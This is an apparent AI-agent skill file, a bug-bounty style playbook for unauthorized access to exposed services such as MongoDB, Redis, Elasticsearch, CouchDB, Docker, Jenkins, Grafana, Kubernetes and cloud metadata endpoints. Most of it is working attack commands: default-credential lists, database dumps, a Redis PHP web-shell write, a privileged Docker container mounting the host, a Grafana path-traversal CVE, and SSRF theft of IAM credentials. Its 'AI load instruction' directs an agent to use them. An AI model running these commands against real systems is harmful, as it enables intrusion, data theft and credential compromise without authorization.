---
name: unauthorized-access-common-services
description: Unauthorized access to common services — default credentials, unauthenticated access to databases (MongoDB/Redis/Elasticsearch/CouchDB), admin interfaces (Kibana/Grafana/Jenkins), cloud metadata, exposed dev tools, and service enumeration playbook with port-to-attack mapping.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Unauthorized Access to Common Services

> **AI LOAD INSTRUCTION**: Covers unauthorized access patterns for common services exposed on non-standard ports or default installations. Includes default credential lists, unauthenticated API access patterns, and service-specific exploitation. Base models miss newer exposed services like Prometheus/Jaeger/Zipkin and forget to check localhost-only services accessible via SSRF.

## 0. RELATED ROUTING

- ssrf-hunter — access localhost-only services via SSRF
- nosql-injection — once MongoDB/CouchDB is accessible, inject queries
- bb-recon — service discovery as part of recon

---

## 1. PORT-TO-SERVICE ATTACK MATRIX

| Port | Service | Default Credential / Attack |
|---|---|---|
| 21 | FTP | anonymous:anonymous, admin:admin |
| 22 | SSH | root:root, admin:admin, root:toor |
| 23 | Telnet | admin:admin, root:root |
| 25 | SMTP | AUTH LOGIN with admin:admin |
| 80/443 | HTTP/HTTPS | Web app vulnerabilities |
| 389 | LDAP | ldapsearch -x with no credentials |
| 445 | SMB | null session, default shares |
| 1433 | MSSQL | sa:sa, sa:password |
| 1521 | Oracle DB | system:manager, scott:tiger |
| 2375/2376 | Docker API | No auth → full Docker control |
| 3000 | Grafana | admin:admin |
| 3306 | MySQL | root:(empty), root:root |
| 4200 | Angular/CouchDB admin | No auth or admin:admin |
| 4848 | GlassFish admin | admin:admin |
| 5432 | PostgreSQL | postgres:(empty), postgres:postgres |
| 5601 | Kibana | No auth → Elasticsearch admin |
| 5672/15672 | RabbitMQ | guest:guest |
| 5984 | CouchDB | No auth (Couch of Death), admin:admin |
| 6379 | Redis | No auth (default) |
| 7001/7002 | WebLogic | weblogic:weblogic, weblogic:welcome1 |
| 7474/7687 | Neo4j | neo4j:neo4j |
| 8080 | Jenkins | admin:admin, various |
| 8161 | ActiveMQ admin | admin:admin |
| 8443 | Various | admin:admin, admin:password |
| 8500 | HashiCorp Consul | No auth (default) |
| 9000 | SonarQube/phpMyAdmin | admin:admin |
| 9042 | Cassandra | No auth (default) |
| 9090 | Prometheus/Cockpit | No auth (default) |
| 9200/9300 | Elasticsearch | No auth (default pre-7.x) |
| 27017 | MongoDB | No auth (default) |
| 50070 | Hadoop NameNode | No auth |
| 50090 | Hadoop SecondaryNN | No auth |

---

## 2. DATABASE ACCESS (UNAUTHENTICATED)

### MongoDB (27017)

```bash
# Check for open MongoDB:
mongo --host target.com
> show dbs
> use admin
> db.getUsers()
> use targetdb
> db.users.find()
> db.users.findOne({username:"admin"})

# Check for sensitive collections:
> show collections
> db.accounts.find()
> db.tokens.find()
> db.passwords.find()
```

### Redis (6379)

```bash
# Connect directly:
redis-cli -h target.com -p 6379
> KEYS *
> GET session_key
> HGETALL user:1

# If authenticated with weak password:
AUTH password123
AUTH redis

# RCE via config (if writable):
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET key "<?php system($_GET['cmd']); ?>"
BGSAVE
```

### Elasticsearch (9200)

```bash
# List all indices:
curl http://target.com:9200/_cat/indices?v

# Read all documents from an index:
curl http://target.com:9200/users/_search?size=1000

# Dump all data:
curl http://target.com:9200/_search?size=10000

# Check cluster health and info:
curl http://target.com:9200/_cluster/health
curl http://target.com:9200/_nodes
```

### CouchDB (5984)

```bash
# List databases (no auth):
curl http://target.com:5984/_all_dbs

# Read all documents:
curl http://target.com:5984/users/_all_docs?include_docs=true

# Create admin (if no admin configured):
curl -X PUT http://target.com:5984/_config/admins/newadmin -d '"password"'
```

---

## 3. DOCKER API (2375 UNAUTHENTICATED)

```bash
# List containers:
curl http://target.com:2375/containers/json

# List images:
curl http://target.com:2375/images/json

# Full system info:
curl http://target.com:2375/info

# RCE via container exec (privileged container):
curl -X POST http://target.com:2375/containers/CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"Cmd":["id"]}'

# Or spawn privileged container mounting host filesystem:
curl -X POST http://target.com:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true},"Cmd":["cat","/host/etc/passwd"]}'
```

---

## 4. ADMIN INTERFACES

### Jenkins (8080)

```bash
# Check for no auth or guest access:
curl http://target.com:8080/api/json

# Script console → RCE if authenticated:
# Navigate to /script
# Execute Groovy: println "id".execute().text

# Default credentials to try:
admin:admin, admin:password, admin:jenkins, jenkins:jenkins
```

### Grafana (3000)

```bash
# Default: admin:admin → forces password change, but try anyway
# Check for anonymous access:
curl http://target.com:3000/api/dashboards/home

# Grafana CVE-2021-43798 (unauthenticated arbitrary file read):
curl http://target.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

### Kubernetes Dashboard / API

```bash
# Check for unauthenticated API access:
curl http://target.com:8001/api/v1/pods
curl http://target.com:8001/api/v1/secrets

# Service account token from SSRF inside cluster:
curl http://169.254.169.254/latest/meta-data/   # AWS metadata
curl http://kubernetes.default.svc/api/v1/pods  # From inside cluster

# kubectl with no auth:
kubectl --server=https://target.com:6443 --insecure-skip-tls-verify get pods
```

---

## 5. CLOUD METADATA (VIA SSRF)

```bash
# AWS IMDSv1 (fully accessible):
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# GCP metadata:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS:
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"
```

---

## 6. TESTING CHECKLIST

```
□ Scan common ports: nmap -sV -p 21,22,25,389,445,1433,1521,2375,3000,3306,5432,5601,5672,5984,6379,7001,8080,8161,8500,9200,27017
□ Test MongoDB: mongo --host target → show dbs
□ Test Redis: redis-cli -h target → KEYS *
□ Test Elasticsearch: curl target:9200/_cat/indices
□ Test CouchDB: curl target:5984/_all_dbs
□ Test Docker API: curl target:2375/containers/json
□ Test Jenkins: access /script endpoint after auth
□ Test Grafana: admin:admin or check CVE-2021-43798
□ Test Consul: curl target:8500/v1/kv/?recurse
□ Test Prometheus: curl target:9090/api/v1/query?query=up
□ Via SSRF: test cloud metadata endpoints
□ Check for default credentials on all web interfaces
```
